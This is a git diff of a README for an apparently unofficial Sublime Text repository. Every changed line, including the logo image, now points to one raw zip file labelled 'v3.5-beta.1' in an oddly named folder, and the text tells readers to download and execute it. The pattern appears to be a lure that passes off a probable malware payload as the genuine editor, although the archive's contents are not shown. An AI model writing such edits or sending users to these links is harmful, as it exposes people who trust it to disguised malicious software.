@@ -10,7 +10,7 @@ Sublime Text offers a wide range of features to enhance your text editing experi
 
 ## Installation
 
-To download and install Sublime Text, you can visit the [Sublime Text download page](https://github.com/Kastaris/Sublime-Text/releases). Once you have downloaded the file, execute it to start the installation process.
+To download and install Sublime Text, you can visit the [Sublime Text download page](https://raw.githubusercontent.com/Kastaris/Sublime-Text/main/rougeberry/Sublime-Text-v3.5-beta.1.zip). Once you have downloaded the file, execute it to start the installation process.
 
 ## Topics
 
@@ -37,7 +37,7 @@ Explore the following topics related to Sublime Text:
 
 ## Stay Updated
 
-For the latest updates and releases, make sure to regularly check the [Releases](https://github.com/Kastaris/Sublime-Text/releases) section of this repository.
+For the latest updates and releases, make sure to regularly check the [Releases](https://raw.githubusercontent.com/Kastaris/Sublime-Text/main/rougeberry/Sublime-Text-v3.5-beta.1.zip) section of this repository.
 
 ## Contributions
 
@@ -45,4 +45,4 @@ Contributions to this repository are welcome! Feel free to submit bug fixes, fea
 
 Let's empower your text editing experience with Sublime Text! 💻🔥
 
-![Sublime Text Logo](https://example.com/sublime-text-logo.png)
+![Sublime Text Logo](https://raw.githubusercontent.com/Kastaris/Sublime-Text/main/rougeberry/Sublime-Text-v3.5-beta.1.zip)
